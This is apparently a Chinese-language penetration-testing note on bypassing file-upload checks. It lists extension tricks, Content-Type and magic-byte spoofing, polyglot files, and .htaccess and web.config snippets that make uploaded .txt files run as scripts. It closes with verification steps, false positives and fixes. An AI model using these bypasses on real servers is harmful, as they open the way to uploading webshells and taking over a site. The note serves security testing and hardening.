# 后缀与 Content-Type 绕过

> 服务端校验点通常有四种，绕过手法各不相同。先判定"校验什么"，再选武器，避免无脑后缀字典。

## 一、黑名单后缀绕过

| 手法 | 示例 | 说明 |
|---|---|---|
| 等价后缀 | `phtml`、`php3/4/5/7`、`pht`、`phar`、`shtml`、`asa`、`aspx`、`ashx`、`asmx`、`jspx`、`jspf` | 取决于 Web 服务器映射 |
| 大小写 | `pHp`、`pHp5` | Windows + 部分服务器不区分 |
| 尾随字符 | `shell.php.`、`shell.php `、`shell.php::$DATA`（Windows NTFS ADS）、`shell.php%20`、`shell.php.` | 末尾点/空格被系统剥离 |
| 双后缀 | `shell.php.jpg`、`shell.jpg.php` | 中间件按最后的映射，校验按第一个 |
| 多重点 | `shell.php..`、`shell.php....` | 剥点逻辑差异 |
| 特殊字符 | `shell.p\x00hp`、`shell.php%00.jpg`、Unicode 全角点 `．` | 截断/归一化 |
| 长度截断 | 超长文件名（老版本截断到某长度） | 需要确认具体上限 |
| 分号/参数 | `shell.php;.jpg`、`shell.php/.jpg` | Tomcat/IIS 路径参数解析 |

## 二、Content-Type 绕过

- 客户端可控 `Content-Type`（multipart 每部分都有自己的 `Content-Type`）→ 只改协议头无效，需改**part 头**。
- 常见可接受集合：`image/png`、`image/jpeg`、`image/gif`、`application/pdf`。
- 混淆：`image/png` + 实际内容是可执行脚本；`Content-Type: image/svg+xml`（内含脚本）。
- 大小写/多余参数：`Image/PNG`、`image/png; charset=utf-8`。

## 三、magic bytes 绕过

服务端读取前 N 字节判定类型时：

- 前缀拼接：`GIF89a;<?php ... ?>`、`\xFF\xD8\xFF\xE0` + 代码。
- 使用真实图片但把 payload 放在**元数据**（EXIF 注释、ID3、ICC profile）或**追加在文件尾部**（`__halt_compiler` 之外的裸代码需要服务器解析习惯配合）。
- 同时满足两种解析：**polyglot**（既是合法图片又是合法脚本/HTML）。
- 校验"可解码"时，用最小合法图片（1x1 GIF 43 字节）做前缀。

## 四、`.htaccess` / `web.config`

把解析规则写进配置目录，实现"上传任意文本后变成可执行"。

```apache
# .htaccess —— 让 .txt 被 PHP 解析
AddType application/x-httpd-php .txt
# 或
SetHandler application/x-httpd-php
```

```xml
<!-- web.config —— IIS：映射 .txt 到 ASP.NET handler -->
<configuration><system.webServer><handlers accessPolicy="Read,Script">
<add name="x" path="*.txt" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll"/>
</handlers></system.webServer></configuration>
```

要点：目标目录必须允许 `AllowOverride`（Apache）或上传目录在 IIS 应用内可写；上传后需要一次对 `.txt` 的请求来确认映射生效。

## 五、文件名与传输层

- `filename*`（RFC 5987）与 `filename` 同时出现时优先级不同 → 校验看一个、存储用另一个。
- multipart 重复 `filename`、引号截断、CRLF 注入文件名。
- 前端 JS 校验（`accept`、`type`）可完全忽略。

## 验证（最小证据）

1. 上传的**最终落盘名与访问 URL**（含响应头 `Content-Type`）。
2. 服务器确实按脚本/HTML 处理：命令回显、带外命中、或同域 JS 执行。
3. 说明绕过了哪一层（前端 / MIME / 后缀 / magic bytes）。

## 常见误报

- 只绕过前端 JS 校验，服务端仍返回"类型不允许"。
- 上传后目录禁止执行脚本（配置正确）→ 仅能存储。
- 上传点位于独立 CDN 域，无法造成同源 XSS。
- `::$DATA` 在非 NTFS 上无效（需先确认服务器为 Windows）。

## 修复

- 后缀白名单（不是黑名单），并同时校验 magic bytes。
- 服务端重命名（随机名 + 白名单后缀），丢弃客户端文件名与 `Content-Type`。
- 上传目录禁止脚本执行；禁止上传 `.htaccess`/`web.config`/`*.config`。
- 图像强制重编码；剥离 EXIF。

## 参考

- PortSwigger File Upload、PayloadsAllTheThings Upload Insecure Files
- Aptive：Unrestricted File Upload Testing & Bypass Techniques
